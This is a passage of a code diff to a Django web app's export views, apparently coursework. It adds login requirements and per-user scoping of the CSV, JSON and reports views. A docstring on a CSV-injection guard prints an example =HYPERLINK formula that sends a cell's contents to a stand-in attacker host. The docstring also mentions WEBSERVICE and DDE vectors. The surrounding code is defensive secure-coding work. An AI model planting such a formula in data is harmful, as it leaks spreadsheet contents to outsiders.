+    every summary, every deadline, in one file, with no slice), so it is the call site where
+    an unscoped queryset costs the most and shows the least.
 
     No query parameters and no slice: an export is a snapshot of the whole table, not a
     filtered feed, which is the difference between this and api_item_queryset(). The ordering
@@ -1303,7 +1576,8 @@ def export_item_queryset():
     serializer does not fire one extra query per row.
     """
     return (
-        BriefItem.objects.select_related("brief__space")
+        owned_items(user)
+        .select_related("brief__space")
         .annotate(receipt_count=Count("messages"))
         .annotate(lane_priority=LANE_PRIORITY)
         .order_by("lane_priority", "rank", "pk")
@@ -1334,8 +1608,7 @@ def csv_safe(value):
     Neutralise a value that a spreadsheet would otherwise run as a formula.
 
     The attack this closes is CSV injection, and the path is real in this project rather than
-    theoretical: the create form on /briefs/<pk>/ takes a free-text title and needs no login,
-    so anyone can store
+    theoretical: the create form on /briefs/<pk>/ takes a free-text title, so a user can store
 
         =HYPERLINK("http://evil.example/leak?c="&A1,"Click for your refund")
 
@@ -1344,6 +1617,13 @@ def csv_safe(value):
     leading =, +, -, @, tab or carriage return as the start of a formula. Quoting does not help:
     Excel strips the CSV quotes first and evaluates what is inside. Depending on the version
     that is a link that exfiltrates a neighbouring cell, a WEBSERVICE() call, or a DDE command.
+
+    Assignment 5 narrowed who can plant that string -- /briefs/<pk>/ now requires a login, so
+    it takes an account rather than a passing stranger -- but it did not close the hole, and
+    this function stays exactly as it was. Authentication answers "who are you", not "is what
+    you typed safe to hand to Excel". Signing in is free (the sign-up page is public, as it
+    has to be), accounts get shared, and the person who opens the downloaded file is a
+    teammate who trusts it because it came from our own site.
 
     The fix is the standard one: prefix the value with an apostrophe, which every spreadsheet
     reads as "the rest of this cell is text". The apostrophe is not part of the value and is not
@@ -1356,6 +1636,7 @@ def csv_safe(value):
     return value
 
 
+@login_required
 def export_items_csv(request):
     """
     PART 3, CSV EXPORT: every BriefItem as a downloadable spreadsheet.
@@ -1371,7 +1652,7 @@ def export_items_csv(request):
     buffer = io.StringIO()
     writer = csv.writer(buffer)
     writer.writerow(EXPORT_COLUMNS)
-    for item in export_item_queryset():
+    for item in export_item_queryset(request.user):
         record = serialize_item(item)
         # Indexing EXPORT_COLUMNS rather than record.values() is what keeps every row aligned
         # with the header no matter what order the serializer builds its dict in.
@@ -1382,6 +1663,7 @@ def export_items_csv(request):
     return response
 
 
+@login_required
 def export_items_json(request):
     """
     PART 3, JSON EXPORT: the same model, the same rows, the same order, as pretty JSON.
@@ -1400,7 +1682,7 @@ def export_items_json(request):
     json_dumps_params={"indent": 2} only changes whitespace, but it is the difference between
     a file a human can read in a text editor and one wall of characters.
     """
-    items = list(export_item_queryset())
+    items = list(export_item_queryset(request.user))
     payload = {
         "generated_at": timezone.now().isoformat(),
         "record_count": len(items),
@@ -1413,6 +1695,7 @@ def export_items_json(request):
     return response
 
 
+@login_required
 def reports(request):
     """
     PART 3, THE REPORTS PAGE: the printable read of the database, and the page the two
@@ -1427,10 +1710,10 @@ def reports(request):
         request,
         "unopsis/reports.html",
         {
-            "summaries": aggregate_summaries(),
+            "summaries": aggregate_summaries(request.user),
             # The same count the JSON export will report, shown on the buttons so somebody
             # knows how big the download is before they ask for it.
-            "export_count": export_item_queryset().count(),
+            "export_count": export_item_queryset(request.user).count(),
             "generated_at": timezone.localtime(),
         },
     )
